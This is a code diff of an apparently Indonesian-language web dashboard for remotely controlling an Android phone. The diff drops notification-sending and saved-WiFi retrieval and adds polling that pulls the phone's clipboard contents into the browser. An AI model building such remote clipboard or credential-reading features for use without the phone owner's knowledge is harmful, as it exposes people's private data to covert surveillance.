@@ -5,8 +5,7 @@ import StatCard from '@/components/StatCard'
 import {
   Battery, BatteryCharging, Cpu, HardDrive, Wifi,
   Clock, RefreshCw, Smartphone, EyeOff, Eye, Bell, BellOff,
-  CreditCard, Signal, Lock, Trash2, Vibrate, Send, Clipboard,
-  WifiOff, Download
+  CreditCard, Signal, Lock, Trash2, Vibrate, Clipboard, Copy
 } from 'lucide-react'
 import { Server } from 'lucide-react'
 
@@ -85,12 +84,10 @@ export default function Dashboard() {
   const [isRinging, setIsRinging] = useState(false)
   const [ctrlBusy, setCtrlBusy]         = useState(false)
   const [vibrateCount, setVibrateCount] = useState(3)
-  const [notifTitle, setNotifTitle]     = useState('')
-  const [notifText, setNotifText]       = useState('')
-  const [showNotifModal, setShowNotifModal] = useState(false)
   const [showWipeConfirm, setShowWipeConfirm] = useState(false)
-  const [lastClipboard, setLastClipboard]     = useState<string | null>(null)
-  const [lastWifi, setLastWifi]               = useState<string | null>(null)
+  const [clipboardContent, setClipboardContent] = useState<string | null>(null)
+  const [clipboardLoading, setClipboardLoading] = useState(false)
+  const [clipboardCopied, setClipboardCopied]   = useState(false)
 
   const fetchDevices = useCallback(async () => {
     try {
@@ -164,38 +161,37 @@ export default function Dashboard() {
     setIsRinging(r => !r)
   }
 
-  const handleSendNotification = async () => {
-    if (!notifTitle.trim()) return
-    await sendControlWithExtra('send_notification', JSON.stringify({ title: notifTitle, text: notifText }))
-    setShowNotifModal(false)
-    setNotifTitle('')
-    setNotifText('')
-  }
-
   const handleGetClipboard = async () => {
     if (!selectedId) return
-    setCtrlBusy(true)
+    setClipboardLoading(true)
+    setClipboardContent(null)
     try {
       await fetch('/api/device/command', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ deviceId: selectedId, command: 'get_clipboard' }),
       })
-      setLastClipboard('Dikirim — lihat hasil di Terminal')
-    } finally { setCtrlBusy(false) }
+      // Poll hasil selama maks 8 detik
+      for (let i = 0; i < 16; i++) {
+        await new Promise(r => setTimeout(r, 500))
+        const res  = await fetch(`/api/device/result?deviceId=${selectedId}`)
+        const data = await res.json()
+        const entry = (data.history ?? []).find(
+          (h: { command: string; result: string }) => h.command === 'get_clipboard'
+        )
+        if (entry?.result) {
+          setClipboardContent(entry.result)
+          break
+        }
+      }
+    } finally { setClipboardLoading(false) }
   }
 
-  const handleGetWifiSaved = async () => {
-    if (!selectedId) return
-    setCtrlBusy(true)
-    try {
-      await fetch('/api/device/command', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ deviceId: selectedId, command: 'get_wifi_saved' }),
-      })
-      setLastWifi('Dikirim — lihat hasil di Terminal')
-    } finally { setCtrlBusy(false) }
+  const handleCopyClipboard = async () => {
+    if (!clipboardContent) return
+    await navigator.clipboard.writeText(clipboardContent)
+    setClipboardCopied(true)
+    setTimeout(() => setClipboardCopied(false), 2000)
   }
 
   const connected = device ? device.connected : false
@@ -569,48 +565,46 @@ export default function Dashboard() {
                   </button>
                 </div>
 
-                {/* Send Notification */}
-                <button
-                  onClick={() => setShowNotifModal(true)}
-                  disabled={ctrlBusy}
-                  className="flex flex-col items-center gap-2 p-3.5 bg-android-bg border border-android-border rounded-xl hover:border-android-green/50 hover:bg-android-green/5 transition-colors disabled:opacity-50 group"
-                >
-                  <div className="p-2 rounded-lg bg-android-green/10 group-hover:bg-android-green/20 transition-colors">
-                    <Send size={18} className="text-android-green" />
-                  </div>
-                  <span className="text-xs font-medium text-android-text">Kirim Notif</span>
-                  <span className="text-xs text-android-muted text-center">Kirim pesan ke HP</span>
-                </button>
-
                 {/* Clipboard */}
-                <button
-                  onClick={handleGetClipboard}
-                  disabled={ctrlBusy}
-                  className="flex flex-col items-center gap-2 p-3.5 bg-android-bg border border-android-border rounded-xl hover:border-android-yellow/50 hover:bg-android-yellow/5 transition-colors disabled:opacity-50 group"
-                >
-                  <div className="p-2 rounded-lg bg-android-yellow/10 group-hover:bg-android-yellow/20 transition-colors">
-                    <Clipboard size={18} className="text-android-yellow" />
+                <div className="flex flex-col gap-2 p-3.5 bg-android-bg border border-android-border rounded-xl sm:col-span-1">
+                  <div className="flex items-center gap-2">
+                    <div className="p-2 rounded-lg bg-android-yellow/10">
+                      <Clipboard size={18} className="text-android-yellow" />
+                    </div>
+                    <span className="text-xs font-medium text-android-text">Clipboard HP</span>
+                    {clipboardContent && (
+                      <button
+                        onClick={handleCopyClipboard}
+                        title="Salin ke clipboard browser"
+                        className="ml-auto p-1.5 rounded-lg bg-android-surface hover:bg-android-yellow/10 text-android-muted hover:text-android-yellow transition-colors"
+                      >
+                        <Copy size={13} />
+                      </button>
+                    )}
                   </div>
-                  <span className="text-xs font-medium text-android-text">Clipboard</span>
-                  <span className="text-xs text-android-muted text-center">
-                    {lastClipboard ?? 'Baca clipboard HP'}
-                  </span>
-                </button>
 
-                {/* WiFi Saved */}
-                <button
-                  onClick={handleGetWifiSaved}
-                  disabled={ctrlBusy}
-                  className="flex flex-col items-center gap-2 p-3.5 bg-android-bg border border-android-border rounded-xl hover:border-sky-500/50 hover:bg-sky-500/5 transition-colors disabled:opacity-50 group"
-                >
-                  <div className="p-2 rounded-lg bg-sky-500/10 group-hover:bg-sky-500/20 transition-colors">
-                    <WifiOff size={18} className="text-sky-400" />
-                  </div>
-                  <span className="text-xs font-medium text-android-text">WiFi Tersimpan</span>
-                  <span className="text-xs text-android-muted text-center">
-                    {lastWifi ?? 'Lihat daftar WiFi'}
-                  </span>
-                </button>
+                  {clipboardContent ? (
+                    <div className="bg-android-surface border border-android-border rounded-lg px-3 py-2 text-xs font-mono text-android-text break-all max-h-20 overflow-y-auto">
+                      {clipboardContent}
+                    </div>
+                  ) : (
+                    <p className="text-xs text-android-muted">
+                      {clipboardLoading ? 'Mengambil clipboard…' : 'Tekan tombol untuk membaca clipboard HP'}
+                    </p>
+                  )}
+
+                  {clipboardCopied && (
+                    <p className="text-xs text-android-green">✓ Disalin ke clipboard browser</p>
+                  )}
+
+                  <button
+                    onClick={handleGetClipboard}
+                    disabled={ctrlBusy || clipboardLoading}
+                    className="w-full py-1.5 rounded-lg text-xs font-semibold bg-android-yellow/10 border border-android-yellow/30 text-android-yellow hover:bg-android-yellow/20 transition-colors disabled:opacity-50"
+                  >
+                    {clipboardLoading ? '⏳ Mengambil…' : '📋 Baca Clipboard'}
+                  </button>
+                </div>
 
                 {/* Wipe Device */}
                 <button
@@ -628,43 +622,6 @@ export default function Dashboard() {
               </div>
             )}
           </div>
-
-          {/* ── SEND NOTIFICATION MODAL ───────────────────────────────────────── */}
-          {showNotifModal && (
-            <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 px-4">
-              <div className="w-full max-w-sm bg-android-surface border border-android-border rounded-2xl p-5 space-y-4">
-                <h3 className="text-sm font-bold text-white flex items-center gap-2"><Send size={15} className="text-android-green" /> Kirim Notifikasi ke HP</h3>
-                <div className="space-y-2.5">
-                  <div>
-                    <label className="text-xs text-android-muted mb-1 block">Judul</label>
-                    <input
-                      type="text"
-                      placeholder="Judul notifikasi…"
-                      value={notifTitle}
-                      onChange={e => setNotifTitle(e.target.value)}
-                      className="w-full px-3 py-2 bg-android-bg border border-android-border rounded-lg text-sm text-android-text placeholder:text-android-muted focus:outline-none focus:border-android-green"
-                    />
-                  </div>
-                  <div>
-                    <label className="text-xs text-android-muted mb-1 block">Pesan</label>
-                    <textarea
-                      placeholder="Isi pesan…"
-                      value={notifText}
-                      onChange={e => setNotifText(e.target.value)}
-                      rows={3}
-                      className="w-full px-3 py-2 bg-android-bg border border-android-border rounded-lg text-sm text-android-text placeholder:text-android-muted focus:outline-none focus:border-android-green resize-none"
-                    />
-                  </div>
-                </div>
-                <div className="flex gap-2">
-                  <button onClick={() => setShowNotifModal(false)} className="flex-1 py-2 rounded-lg text-xs font-medium border border-android-border text-android-muted hover:text-white transition-colors">Batal</button>
-                  <button onClick={handleSendNotification} disabled={!notifTitle.trim() || ctrlBusy} className="flex-1 py-2 rounded-lg text-xs font-semibold bg-android-green/10 border border-android-green/40 text-android-green hover:bg-android-green/20 transition-colors disabled:opacity-50">
-                    {ctrlBusy ? '…' : '📢 Kirim'}
-                  </button>
-                </div>
-              </div>
-            </div>
-          )}
 
           {/* ── WIPE CONFIRM MODAL ────────────────────────────────────────────── */}
           {showWipeConfirm && (
